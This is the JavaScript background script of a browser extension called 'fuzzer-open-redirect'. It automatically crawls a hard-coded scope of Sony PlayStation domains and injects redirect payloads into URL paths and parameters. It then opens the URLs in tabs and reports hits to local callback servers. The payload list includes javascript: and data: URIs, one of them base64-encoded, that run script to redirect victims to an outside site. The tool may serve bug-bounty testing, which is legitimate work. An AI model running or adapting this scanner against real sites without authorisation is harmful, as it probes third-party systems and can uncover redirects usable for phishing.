/**
 * Background script for fuzzer-open-redirect.
 */

"use strict";

let localStorage = {
	injectedParameterURLsQueue: [],
	injectedPathURLsQueue: [],
	injectedRedirectParameterURLsQueue: [],
	requestedURLs: [],
	scannableURLsQueue: [],
};

let bufferLengthURLs = 80;
let crawlerScripts = [];
let delayForceWakeTabsThread = 1000;
let delayPendingRetryURLsThread = 20000;
let delayRangeRequests = [6000, 8000];
let delayTabLimitCheck = 1000;
let delayTabRemovalThread = 30000;
let delayThreadPause = 1000;
let delayURLIndexing = 10;
let threadCount = 2;
let timeoutCallback = 40000;
let timeoutRequests = 40000;
let isRequestThreadPaused = false;
let limitOfTabs = 5;
let requestPriorities = [
	1, /* injected path */
	2, /* injected redirect parameter */
	0, /* injected parameter */
	3, /* scan */
];
let retryAttempts = 6;
let scope = [
	"*://*.playstation.net",
	"*://*.sonyentertainmentnetwork.com",
	"*://*.api.playstation.com",
	"*://my.playstation.com",
	"*://store.playstation.com",
	"*://social.playstation.com",
	"*://transact.playstation.com",
	"*://wallets.playstation.com",
	"*://direct.playstation.com",
	"*://api.direct.playstation.com",
];
let statusCodesFail = ["4*", "5*"];

const consoleCSS = "background-color:rgb(80,255,0);text-shadow:0 1px 1px rgba(0,0,0,.3);color:black";
const redirectURLs = [
	"https://runescape.com",
	"http://runescape.com",
	"//runescape.com",
	"data:text/html,<script>location='https://runescape.com'</script>",
	"data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0naHR0cHM6Ly9ydW5lc2NhcGUuY29tJzwvc2NyaXB0Pg",
	"javascript:location='https://runescape.com'",
	"javascript:location='//runescape.com'",
];
const regexpSelectorEscapeChars = /([^*a-z0-9\]])/ig;
const regexpSelectorLeadingAndTrailingWhitespace = /^\s*(.*)\s*$/g;
const regexpSelectorURLHost = /^((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.){1,63}(?:[a-z]{1,63})|(?:25[0-5]|2[0-4][0-9]|[1][0-9][0-9]|[1-9]?[0-9])\.(?:25[0-5]|2[0-4][0-9]|[1][0-9][0-9]|[1-9]?[0-9])\.(?:25[0-5]|2[0-4][0-9]|[1][0-9][0-9]|[1-9]?[0-9])\.(?:25[0-5]|2[0-4][0-9]|[1][0-9][0-9]|[1-9]?[0-9]))?.*$/i;
const regexpSelectorURLPath = /^([^?#]{1,2048})?.*$/i;
const regexpSelectorURLPort = /^([:](?:6553[0-5]|655[0-2][0-9]|65[0-4][0-9][0-9]|6[0-4][0-9][0-9][0-9]|[0-5][0-9][0-9][0-9][0-9]|[1-9][0-9]{0,3}))?.*$/i;
const regexpSelectorURLProtocol = /^((?:[a-z0-9.+-]{1,256}[:])(?:[/][/])?|(?:[a-z0-9.+-]{1,256}[:])?[/][/])?.*$/i;
const regexpSelectorURLSchemeEscaped = /^([a-z0-9.+-]*)\*([a-z0-9.+-]*)\[:\]/ig;
const regexpSelectorURLSearch = /^([?][^#]{0,2048})?.*$/i;
const regexpSelectorWildcardStatusCode = /\*/g;
const regexpSelectorWildcardSubdomainEscaped = /\*\[\.\]/g;

let callbackURLOpenRedirectTimestamps = "http://0.0.0.0:4242";
let callbackURLRequestTimestamps = "http://0.0.0.0:4243";
let parsedCallbackURLOpenRedirectTimestamps = ["","","","","",""];
let parsedCallbackURLRequestTimestamps = ["","","","","",""];
let pendingRetryURLs = [];
let pendingRetryCallbackURLs = [];
let scanOutOfScopeOrigins = false;
let scannableURLs = [];
let tabAnchorId;
let tabIds = [];
let tabRemovalBuffer = [];
let windowId;
let worker = new Worker(chrome.runtime.getURL("/assets/js/worker.js"));

/**
 * Buffered and throttled method that returns the index of a given target object in a given
 * array.
 */
const bufferedIndexOf = async (arr, target, bufferLength, throttleDuration) => {
	const amountOfChunks = Math.ceil(arr.length / bufferLength);
	for (let a = 0; a < amountOfChunks; a++) {
		for (
			let b = a * bufferLength;
			   b < arr.length
			&& b < (a * bufferLength) + bufferLength - 1;
			b++
		) {
			if (arr[b] === target) {
				return b;
			}
		}
		await sleep(throttleDuration);
	}
	return -1;
};

/**
 * Chunks a given array to a given length.
 */
const chunkArrayToAmountOfChunks = (array, amountOfChunks) => {
	const chunkSize = Math.ceil(array.length / amountOfChunks);
	const chunks = new Array(amountOfChunks);
	for (let a = 0; a < amountOfChunks; a++) {
		chunks[a] = array.slice(chunkSize * a, (chunkSize * a) + chunkSize);
	}
	return chunks;
};

/**
 * Chunks a given array based on a given length of each chunk.
 */
const chunkArrayWithChunkSize = (array, chunkSize) => {
	const amountOfChunks = Math.ceil(array.length / chunkSize);
	const chunks = new Array(amountOfChunks);
	for (let a = 0; a < amountOfChunks; a++) {
		chunks[a] = array.slice(chunkSize * a, (chunkSize * a) + chunkSize);
	}
	return chunks;
};

/**
 * Returns an integer value between a minimum and maximum range of
 * milliseconds.
 */
const getIntFromRange = (min, max) => {
	return parseInt(min + (Math.random() * (max - min)));
};

/**
 * Returns the current timestamp.
 */
const getTimestamp = () => {
	const date = new Date();
	return date.toLocaleDateString() + " " + date.toLocaleTimeString();
};

/**
 * Returns true if a given status code string matches the specified
 * fail status code specifiers.
 */
const isFailStatusCode = statusCodeString => {
	for (let a = 0; a < statusCodesFail.length; a++) {
		const selector = new RegExp("^" + statusCodesFail[a].replace(regexpSelectorWildcardStatusCode, "[0-9]+") + "$");
		if (selector.test(statusCodeString)) {
			return true;
		}
	}
	return false;
};

/**
 * (example input: "http://www.in.scope.domain.com")
 * (example output given "\*://\*.in.scope.*" is in the scope: true)
 */
const isInScopeOrigin = origin => {
	for (let a = 0; a < scope.length; a++) {
		const regexpInScopeOrigin = new RegExp(
			"^" + scope[a]
				.replace(regexpSelectorEscapeChars, "[$1]") /* escape chars */
				.replace(regexpSelectorURLSchemeEscaped, "$1[a-z0-9.+-]+$2:") /* scheme */
				.replace(regexpSelectorWildcardSubdomainEscaped, "(?:(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?[.])+)"), /* host wildcard */
			"ig");
		if (regexpInScopeOrigin.test(origin)) {
			return true;
		}
	}
	return false;
}

/**
 * Returns a promise that resolves the local storage object.
 */
const loadStorage = async () => {
	return new Promise(res => {
		chrome.storage.local.get(storage => {
			if (!storage.injectedParameterURLsQueue) {
				storage.injectedParameterURLsQueue = localStorage.injectedParameterURLsQueue;
			}
			if (!storage.injectedPathURLsQueue) {
				storage.injectedPathURLsQueue = localStorage.injectedPathURLsQueue;
			}
			if (!storage.injectedRedirectParameterURLsQueue) {
				storage.injectedRedirectParameterURLsQueue = localStorage.injectedRedirectParameterURLsQueue;
			}
			if (!storage.requestedURLs) {
				storage.requestedURLs = localStorage.requestedURLs;
			}
			if (!storage.scannableURLsQueue) {
				storage.scannableURLsQueue = localStorage.scannableURLsQueue;
			}
			res(storage);
		});
	});
};

/**
 * Opens a given URL in a new scanner tab.
 */
const openURLInNewTab = async url => {
	return new Promise(async res => {
		chrome.tabs.create({
			url: url,
			windowId: windowId,
		}, async tab => {
			if (!tab) isRequestThreadPaused = true;
			tabIds.push(tab.id);
			// execute crawlerScripts
			if (
				bufferedIndexOf(
					localStorage.requestedURLs,
					url,
					bufferLengthURLs,
					delayURLIndexing) === -1
			) {
				localStorage.requestedURLs.push(url);
				await writeStorage();
			}
			res(tab);
		});
	});
};

/**
 * Opens new windows for fuzzing and scanning.
 */
const openWindow = async () => {
	return new Promise(res => {
		chrome.windows.create({
			url: "data:text/html,<title>about:black</title><body bgcolor=black>",
		}, w => {
			chrome.tabs.query({}, tabs => tabs.forEach(tab => {
				if (tab.windowId === w.id) tabAnchorId = tab.id;
			}));
			windowId = w.id
			res();
		});
	});
};

/**
 * 
 */
const parseCallbackURLs = async () => {
	return new Promise((res, err) => {
		/* Parse specified callback URLs for open redirects and requests. */
		parsedCallbackURLOpenRedirectTimestamps = parseURL(callbackURLOpenRedirectTimestamps);
		if (parsedCallbackURLOpenRedirectTimestamps[1] === "") {
			console.error("%cfuzzer-open-redirect", consoleCSS,
				"No valid origin was provided in the specified callback URL for open redirect timestamps (" + callbackURLOpenRedirectTimestamps + ").");
			err();
		}
		if (parsedCallbackURLOpenRedirectTimestamps[0] === "") {
			console.warn("%cfuzzer-open-redirect", consoleCSS,
				"No protocol was provided in the specified callback URL for open redirect timestamps (" + callbackURLOpenRedirectTimestamps + ").",
				"Defaulting to \"http://\".");
			parsedCallbackURLOpenRedirectTimestamps[0] = "http://";
		}
		console.log("%cfuzzer-open-redirect", consoleCSS,
			"Callback URL for open redirect timestamps is parsed: " +
			parsedCallbackURLOpenRedirectTimestamps.join(""));
		parsedCallbackURLRequestTimestamps = parseURL(callbackURLRequestTimestamps);
		if (parsedCallbackURLRequestTimestamps[1] === "") {
			console.error("%cfuzzer-open-redirect", consoleCSS,
				"No valid origin was provided in the specified callback URL for request timestamps (" + callbackURLOpenRedirectTimestamps + ").");
			err();
		}
		if (parsedCallbackURLRequestTimestamps[0] === "") {
			console.warn("%cfuzzer-open-redirect", consoleCSS,
				"No protocol was provided in the specified callback URL for request timestamps (" + callbackURLOpenRedirectTimestamps + ").",
				"Defaulting to \"http://\".");
			parsedCallbackURLRequestTimestamps[0] = "http://";
		}
		console.log("%cfuzzer-open-redirect", consoleCSS,
			"Callback URL for request timestamps is parsed: " +
			parsedCallbackURLRequestTimestamps.join(""));
		res();
	});
};

/**
 * Returns an array containing the protocol, host, port, path, search
 * and hash of a given URL if found.
 * (example input: "/path/to/file?v=4.4.2#hash")
 * (example output: [
 *   "",
 *   "",
 *   "",
 *   "/path/to/file",
 *   "?v=4.4.2",
 *   "#hash"
 * ])
 */
const parseURL = url => {
	let sliceLength = 0;
	const strippedURL = trimLeadingAndTrailingWhitespaces(url);
	const retval = ["","","","","",""];
	/* protocol */
	retval[0] = strippedURL.replace(regexpSelectorURLProtocol, "$1");
	const protocol = retval[0].toLowerCase();
	if (protocol.length !== 0) {
		if (
			   protocol === "data:"
			|| protocol === "javascript:"
		) {
			retval[3] = url.slice(retval[0].length);
			return retval;
		}
		/* host */
		retval[1] = strippedURL.slice(retval[0].length).replace(regexpSelectorURLHost, "$1");
	}
	/* port */
	sliceLength = retval[0].length + retval[1].length;
	retval[2] = strippedURL.slice(sliceLength).replace(regexpSelectorURLPort, "$1");
	/* path */
	sliceLength = sliceLength + retval[2].length;
	retval[3] = strippedURL.slice(sliceLength).replace(regexpSelectorURLPath, "$1");
	/* search */
	sliceLength = sliceLength + retval[3].length;
	retval[4] = strippedURL.slice(sliceLength).replace(regexpSelectorURLSearch, "$1");
	/* hash */
	retval[5] = strippedURL.slice(sliceLength + retval[4].length);
	return retval;
};

/**
 * Register message listener.
 */
const registerMessageListener = () => {
	chrome.runtime.onMessage.addListener(async (message, sender) => {
		if (
			   message.injectableParameterURLs
			|| message.scannableURLs
		) {
			worker.postMessage(message);
		}
		if (message.timestamp) {
			console.log("Open redirect found at ", message.timestamp);
			sendCallback(message.timestamp, "", "OPEN_REDIRECT_CALLBACK");
		}
		if (message.message) {
			if (message.message === "FRAME_READYSTATE_COMPLETE") {
				removeTab(sender.tab.id);
				tabIds = tabIds.filter(tab => {
					return tab.id !== sender.tab.id;
				});
			}
		}
	});
	worker.onmessage = async message => {
		if (message.data.appendage) {
			if (message.data.appendage.injectedParameterURLsQueue) {
				localStorage.injectedParameterURLsQueue = localStorage.injectedParameterURLsQueue.concat(
					message.data.appendage.injectedParameterURLsQueue);
			}
			if (message.data.appendage.injectedPathURLsQueue) {
				localStorage.injectedPathURLsQueue = localStorage.injectedPathURLsQueue.concat(
					message.data.appendage.injectedPathURLsQueue);
			}
			if (message.data.appendage.injectedRedirectParameterURLsQueue) {
				localStorage.injectedRedirectParameterURLsQueue = localStorage.injectedRedirectParameterURLsQueue.concat(
					message.data.appendage.injectedRedirectParameterURLsQueue);
			}
			if (message.data.appendage.scannableURLsQueue) {
				localStorage.scannableURLsQueue = localStorage.scannableURLsQueue.concat(
					message.data.appendage.scannableURLsQueue);
			}
			await writeStorage();
		}
	};
};

/**
 * Registers webRequest listeners.
 */
const registerWebRequestListeners = () => {
	/* Record offline error responses from main frames with no content scripts and remove their tabs. */
	chrome.webRequest.onErrorOccurred.addListener(
		details => {
			if (details.type === "main_frame") {
				chrome.tabs.get(details.tabId, tab => {
					if (!chrome.runtime.lastError && tab && tab.windowId === windowId) {
						removeTab(details.tabId);
						if (
							bufferedIndexOf(
								pendingRetryURLs,
								details.url,
								bufferLengthURLs,
								delayURLIndexing) === -1
						) {
							pendingRetryURLs.push(details.url);
						}
					}
				});
			}
		},
		{"urls": ["<all_urls>"]},
		[]);
	/* Record responses from main frames that match a specified fail status code. */
	chrome.webRequest.onHeadersReceived.addListener(
		details => {
			if (details.type === "main_frame") {
				if (isFailStatusCode(details.statusCode.toString())) {
					if (
						bufferedIndexOf(
							pendingRetryURLs,
							details.url,
							bufferLengthURLs,
							delayURLIndexing) === -1
					) {
						pendingRetryURLs.push(details.url);
					}
				}
			}
		},
		{"urls": ["<all_urls>"]},
		[]);
};

/**
 * Returns a promise to remove a tab with the specified ID.
 */
const removeTab = async id => {
	return new Promise(res => {
		chrome.tabs.get(id, tab => {
			if (
				   !chrome.runtime.lastError
				&& tab
				&& tab.windowId === windowId
			) {
				chrome.tabs.remove(id)
				res();
			}
		});
	});
};

/**
 * Sends a callback at a given timestamp for a given type.
 * (example input: ("03/12/2020 01:06:05", "...", "OPEN_REDIRECT_CALLBACK"))
 * (example input: ("03/12/2020 01:06:05", "...", "REQUEST_CALLBACK"))
 */
const sendCallback = async (timestamp, url, callbackType) => {
	return new Promise((res, err) => {
		let callbackURL = "";
		switch (callbackType) {
			case "OPEN_REDIRECT_CALLBACK":
				if (parsedCallbackURLOpenRedirectTimestamps[4] !== "") {
					callbackURL = parsedCallbackURLOpenRedirectTimestamps.slice(0, 5).join("") +
						"&timestamp=" + encodeURIComponent(timestamp) +
						"&url=" + encodeURIComponent(url) +
						parsedCallbackURLOpenRedirectTimestamps[5];
				} else {
					callbackURL = parsedCallbackURLOpenRedirectTimestamps.slice(0, 4).join("") +
						"?timestamp=" + encodeURIComponent(timestamp) +
						"&url=" + encodeURIComponent(url) +
						parsedCallbackURLOpenRedirectTimestamps[5];
				}
				break;
			case "REQUEST_CALLBACK":
				if (parsedCallbackURLRequestTimestamps[4] !== "") {
					callbackURL = parsedCallbackURLRequestTimestamps.slice(0, 5).join("") +
						"&timestamp=" + encodeURIComponent(timestamp) +
						"&url=" + encodeURIComponent(url) +
						parsedCallbackURLRequestTimestamps[5];
				} else {
					callbackURL = parsedCallbackURLRequestTimestamps.slice(0, 4).join("") +
						"?timestamp=" + encodeURIComponent(timestamp) +
						"&url=" + encodeURIComponent(url) +
						parsedCallbackURLOpenRedirectTimestamps[5];
				}
				break;
		}
		if (callbackURL.length !== 0) {
			fetch(callbackURL).then(_res => {
				if (!_res.ok) {
					if (!pendingRetryCallbackURLs[callbackURL]) {
						pendingRetryCallbackURLs[callbackURL] = {attempts: 0};
					}
				}
				res();
			}).catch(e => {
				err(e);
			});
		} else {
			err("Unable to create callback URL, " + "\n" +
				"timestamp: " + timestamp + "\n" +
				"callback type: " + callbackType + "\n" +
				"callback URLs: " + callbackURLRequestTimestamps +
					", " + callbackURLOpenRedirectTimestamps);
		}
	});
};

/**
 * Sleeps an awaited promise value for the given amount of
 * milliseconds.
 */
const sleep = ms => {
	return new Promise(res => {
		setTimeout(res, ms);
	});
};

/**
 * Force-wakes all tabs indefinitely.
 */
const startForceWakeTabsThread = async () => {
	while (true) {
		if (tabIds.length === 0) {
			await sleep(delayForceWakeTabsThread);
		}
		for (let a = 0; a < tabIds.length; a++) {
			chrome.tabs.get(tabIds[a], tab => {
				if (!chrome.runtime.lastError && tab) {
					chrome.tabs.update(tab.id, {
						active: true,
						selected: true,
					}, () => {});
				} else {
					tabIds = tabIds.filter(id => {
						return id !== tabIds[a];
					});
				}
			});
			await sleep(delayForceWakeTabsThread);
		}
	}
};

/**
 * Tries to request pending URLs that timed out.
 */
const startPendingRetryURLsThread = async () => {
//  while (true) {
//    pendingRetryURLs.forEach(url => {
//      if (
//            parseURL(url).slice(0, 2)
//        === parseURL(callbackURLOpenRedirectTimestamps).slice(0, 2)
//      ) {
//        openURLInNewTab(url).then(() => {
//          pendingRetryURLs = pendingRetryURLs.filter(_url => {
//            return url !== _url;
//          });
//        });
//      }
//    });
//    await sleep(delayPendingRetryURLsThread);
//  }
};

/**
 * Starts requesting an indefinite amount of queued URLs.
 */
const startRequestThread = async () => {
	for (let a = 0; a < threadCount; a++) {
		(async () => {
			while (true) {
				while (isRequestThreadPaused) {
					await sleep(delayThreadPause);
				}
				while (tabIds.length >= limitOfTabs) {
					await sleep(delayTabLimitCheck);
				}
				let URL = "";
				for (let b = 0; b < requestPriorities.length; b++) {
					if (URL.length !== 0) {
						break;
					}
					switch (requestPriorities[b]) {
						case 0:  /* injected parameter */
							if (localStorage.injectedParameterURLsQueue.length !== 0) {
								URL = localStorage.injectedParameterURLsQueue[0];
								localStorage.injectedParameterURLsQueue = localStorage.injectedParameterURLsQueue.slice(1);
							}
						break;
						case 1:  /* injected path */
							if (localStorage.injectedPathURLsQueue.length !== 0) {
								URL = localStorage.injectedPathURLsQueue[0];
								localStorage.injectedPathURLsQueue = localStorage.injectedPathURLsQueue.slice(1);
							}
							break;
						case 2:  /* injected redirect parameter */
							if (localStorage.injectedRedirectParameterURLsQueue.length !== 0) {
								URL = localStorage.injectedRedirectParameterURLsQueue[0];
								localStorage.injectedRedirectParameterURLsQueue = localStorage.injectedRedirectParameterURLsQueue.slice(1);
							}
							break;
						case 3:  /* scan */
							if (localStorage.scannableURLsQueue.length !== 0) {
								URL = localStorage.scannableURLsQueue[0];
								localStorage.scannableURLsQueue = localStorage.scannableURLsQueue.slice(1);
							}
							break;
					}
				}
				if (URL.length !== 0) {
					if (URL.startsWith("//")) URL = `http:${URL}`;
					const parsedURL = parseURL(URL);
					if (
						   scanOutOfScopeOrigins
						|| isInScopeOrigin(parsedURL.slice(0, 2).join(""))
					) {
						sendCallback(getTimestamp(), URL, "REQUEST_CALLBACK");
						openURLInNewTab(URL);
					}
					await writeStorage();
				}
				await sleep(getIntFromRange(
					delayRangeRequests[0],
					delayRangeRequests[1]));
			}
		})();
	}
};

/**
 * Starts looking for seemingly idle tabs and removes them.
 */
const startTabRemovalThread = async () => {
	while (true) {
		chrome.tabs.query({}, tabs => {
			tabs.forEach(tab => {
				if (
					   tab.windowId === windowId
					&& tab.id !== tabAnchorId
				) {
					if (tabRemovalBuffer.indexOf(tab.id) === -1) {
						tabRemovalBuffer.push(tab.id);
					} else {
						removeTab(tab.id);
						tabRemovalBuffer = tabRemovalBuffer.filter(id => {
							return id !== tab.id;
						});
					}
				}
			});
		});
		await sleep(delayTabRemovalThread);
	}
};

/**
 * Trims all leading and trailing whitespaces off a given string.
 * (example input: " https://example.com/  \n")
 * (example output: "https://example.com/")
 */
const trimLeadingAndTrailingWhitespaces = str => {
	return str.replace(regexpSelectorLeadingAndTrailingWhitespace, "$1");
};

/**
 * Writes the localStorage object as the extension's local storage
 * object.
 */
const writeStorage = () => {
	return new Promise(resolve => {
		chrome.storage.local.set(localStorage, resolve);
	});
};

/**
 * Init background script.
 */
(() => {
	parseCallbackURLs().then(async () => {
		localStorage = await loadStorage();
		worker.postMessage({threadCount: threadCount});
		registerMessageListener();
		registerWebRequestListeners();
		await openWindow();
		startForceWakeTabsThread();
		startPendingRetryURLsThread();
		startRequestThread();
		startTabRemovalThread();

		openURLInNewTab("https://store.playstation.com/");
	});
})();
